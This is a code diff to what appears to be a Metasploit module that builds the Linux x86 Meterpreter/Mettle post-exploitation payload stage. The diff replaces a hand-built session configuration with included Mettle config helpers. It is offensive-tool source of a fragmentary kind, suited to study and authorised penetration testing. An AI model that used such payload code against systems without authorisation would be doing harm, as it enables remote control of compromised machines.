@@ -1,6 +1,5 @@
 # -*- coding: binary -*-
 
-
 module Msf
 
 ###
@@ -10,6 +9,9 @@ module Msf
 ###
 
 module Payload::Linux::X86::MeterpreterLoader
+
+  include Msf::Sessions::MeterpreterOptions::Linux
+  include Msf::Sessions::MettleConfig
 
   def initialize(info = {})
     super(update_info(info,
@@ -21,37 +23,10 @@ module Payload::Linux::X86::MeterpreterLoader
       ))
   end
 
-  def stage_payload(opts={})
-    stage_meterpreter(opts) + generate_config(opts)
-  end
-
-  def generate_config(opts={})
-    ds = opts[:datastore] || datastore
-    opts[:uuid] ||= generate_payload_uuid
-
-    # create the configuration block, which for staged connections is really simple.
-    config_opts = {
-      arch:              opts[:uuid].arch,
-      null_session_guid: opts[:null_session_guid] == true,
-      exitfunk:          ds[:exit_func] || ds['EXITFUNC'],
-      expiration:        (ds[:expiration] || ds['SessionExpirationTimeout']).to_i,
-      uuid:              opts[:uuid],
-      transports:        opts[:transport_config] || [transport_config(opts)],
-      extensions:        [],
-      stageless:         opts[:stageless] == true,
-    }.merge(meterpreter_logging_config(opts))
-    # create the configuration instance based off the parameters
-    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
-
-    # return the binary version of it
-    config.to_b
-  end
-
   def stage_meterpreter(opts={})
-
+    opts = mettle_logging_config(opts).merge(opts)
+    MetasploitPayloads::Mettle.new('i486-linux-musl', generate_config(opts)).to_binary :process_image
   end
-
 end
 
 end
-
